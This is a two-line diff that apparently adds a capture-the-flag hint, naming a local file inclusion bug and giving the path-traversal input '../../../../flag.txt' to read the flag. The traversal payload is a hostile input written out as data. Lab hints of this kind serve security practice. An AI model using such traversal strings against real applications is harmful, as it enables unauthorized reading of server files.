@@ -1,0 +1,2 @@
+just a simple lfi
+supply ../../../../flag.txt
